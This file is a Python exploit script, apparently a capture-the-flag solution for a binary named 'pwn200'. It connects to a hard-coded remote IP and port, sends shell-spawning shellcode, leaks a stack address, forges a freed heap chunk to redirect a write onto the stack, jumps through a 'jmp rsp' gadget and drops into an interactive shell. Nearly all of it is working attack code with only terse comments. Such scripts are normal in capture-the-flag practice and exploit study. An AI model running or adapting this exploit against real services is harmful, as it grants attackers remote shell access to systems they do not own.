from zio import *

target = './pwn200'
target = ('119.28.63.211', 2333)
io  = zio(target, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 10000)
io.rl()

# x86/bsd/exec: 24 bytes
shellcode = (
            "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
            "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
            )
# leak stack
fake = shellcode.ljust(0x30, 'A')   # shellcode
io.w(fake)
io.rtl('A' * (0x30 - len(shellcode)))
stack_ptr = l64(io.rtl(',')[:-1].ljust(0x8, '\x00')) - 0xb0
print '[+] leak stack pointer\t:\t0x%x' % stack_ptr

io.rtl('id ~~?')
io.wl(0x20)                         # size of next chunk

fake  = 'A' * 0x8
fake += l64(0x61)                   # size of free'd chunk
fake += 'A' * 0x28
fake += l64(stack_ptr)              # vuln stack pointer

io.rtl('money~')
io.w(fake)

io.rtl('choice')
io.wl(2)

io.rtl('choice')
fake  = 'A' * 0x38
fake += l64(0x00400d1b)             # jmp rsp
fake += '\xeb\x1e\x00\x00'          # short jmp
fake  = fake.ljust(0x10, 'B')
io.wls([1, 0x50, fake])

io.wl(3)                            # ret to get shell
io.itr()